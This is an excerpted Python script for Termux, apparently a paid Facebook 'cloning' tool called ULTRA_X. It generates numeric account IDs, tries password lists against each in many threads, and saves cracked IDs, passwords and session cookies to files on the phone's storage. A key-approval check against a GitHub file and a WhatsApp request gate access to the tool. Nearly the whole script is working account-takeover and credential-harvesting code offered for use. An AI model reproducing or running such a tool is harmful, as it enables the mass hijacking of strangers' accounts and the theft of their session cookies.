...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.ULTRA-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.ULTRA-cov', 'w')
	kok.write(myid+imt)
	kok.close()
...
╚██████╔╝███████╗██║   ██║  ██║██║  ██║     ██╔╝ ██╗
 ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝
\t   \033[31;42mULTRA_X\33[0;m\__😘😈
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : ULTRA_X
  [\x1b[1;95m+\x1b[1;97m] GITHUB : ULTRA404-cyber        
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : ULTRA_X X X 
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : ULTRA_X                       
...
def Main():
	...
	dek(f"  [\x1b[1;92mB\x1b[1;97m] RANDOM CLONING")
...
def method1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mULTRA\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ULTRA=session.cookies.get_dict().keys()
                        if "c_user" in ULTRA:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                dek(f'\r\r\033[1;35m [\033[1;37mULTRA-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas))
                                open('/sdcard/ULTRA-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/ULTRA-file-COKI.txt','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ULTRA:
                                if 'y' in hdcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mULTRA-CP\033[1;35m]\x1b[1;91m '+ids+' \033[1;37m| \x1b[1;91m'+pas+'\033[1;97m')
                                        open('/sdcard/ULTRA-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def method2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mULTRA-M1\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ULTRA:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                dek(f'\r\r\033[1;35m [\033[1;37mULTRA-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas));dek("\033[1;37m [\033[1;36mCOOKIES🍪\033[1;37m] : \33[1;92m"+kuki+"")
                                open('/sdcard/ULTRA-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/ULTRA-FILE-COKI','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ULTRA:
                                if 'y' in hdcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mULTRA-CP\033[1;35m]\x1b[1;90m '+ids+' \033[1;37m| \x1b[1;90m'+pas+'\033[1;97m')
                                        open('/sdcard/ULTRA-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def xxggx():
	os.system('clear')
	dek(logo)
	dek("  [A] 6 DIGIT CLONING\n  [B] 7 DIGIT CLONING \n  [C] 8 DIGIT CLONING \n  [D] 11 DIGIT CLONING\n  [E] MIX CLONING \n  [X] EXIT");tln()
	dzxx = input(f"  [✓] CHOICE: ")
	if dzxx in ["1", "01","11","A","a"]:
		digit6()
	elif dzxx in ["2", "02","22","B","b"]:
		digit7()
	elif dzxx in ["3", "03","33","C","c"]:
		digit8()
	elif dzxx in ["4", "04","44","D","d"]:
		digit11()
	elif dzxx in ["5", "05","55","E","e"]:
		mix()
	elif dzxx in ["6", "06","66","X","x"]:
		Main()
	else:
		()
...
def digit8():
                ...
                try:
                        ...
                        print(40*"=")
                        ULTRAx = input("  [\x1b[1;96m+\x1b[1;97m] Choose :- ")
                except ValueError:
                        limit = 5000
                ...
                with tred(max_workers=30) as manshera:     
                        ...
                        for psx in user:
                                ...
                                if ULTRAx in ["1", "01","11","A","a","y","Y","YY","yy"]:
                                    manshera.submit(M1,uid,pwx,tl)
                                elif ULTRAx in ["2", "02","22","B","b","N","n","NN","nn"]:
...
def digit6():
    ...
    with tred(max_workers=80) as manshera:    
        ...
        for love in user:
            ...
            if ULTRAx in ["1", "01","12","N","n"]:
                manshera.submit(M1,uid,pwx,tl)
            elif ULTRAx in ["2", "02","22","Y","y"]:
                 manshera.submit(M2,uid,pwx,tl)
            else:
                 manshera.submit(M3,uid,pwx,tl)
def digit7():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(' \033[1;35m[\033[1;37mULTRA-OK\033[1;35m]\033[1;32m '+uid+' \033[1;37m| \033[1;32m'+ps+'\033[0;97m \n''\033[1;37m[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;96m'+coki+'\n')
                cek_apk(session,coki)
                open('/sdcard/ULTRA-0X-OK.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \033[1;35m[\033[1;37mULTRA-CP\033[1;35m]\033[1;31m '+uid+' \033[1;37m| \033[1;31m'+ps+'\033[0;97m')
                open('/sdcard/ULTRA-0X-CP.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m [ULTRA] %s | [OK:-%s]\r\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass
...
\t   \033[31;42mULTRA_X\33[0;m\__😘😈
\x1b[1;97m{40*"="} 
  [\x1b[1;96m+\x1b[1;97m] AUTHOR : ULTRA_X
  [\x1b[1;96m+\x1b[1;97m] GITHUB : ULTRA_X        
  [\x1b[1;96m+\x1b[1;97m] FACEBOOK : Hasan Mahmud 
  [\x1b[1;96m+\x1b[1;97m] YOU TUBE : ULTRA_X                       
  [\x1b[1;96m+\x1b[1;97m] TOOLS : \x1b[1;92mPAID\x1b[1;97m
{40*"="}\x1b[1;97m""")
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.ULTRA-cov', 'r').read()
	r1=requests.get("https://github.com/sifatraj202/ULTRA_X/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		dek(logo1)
		Main()
		...
		time.sleep(1.5)
		ULTRA_Xs = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20''%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
		os.system('am start https://wa.me/+8801312376738?text=' + ULTRA_Xs)
		Subscraption()        
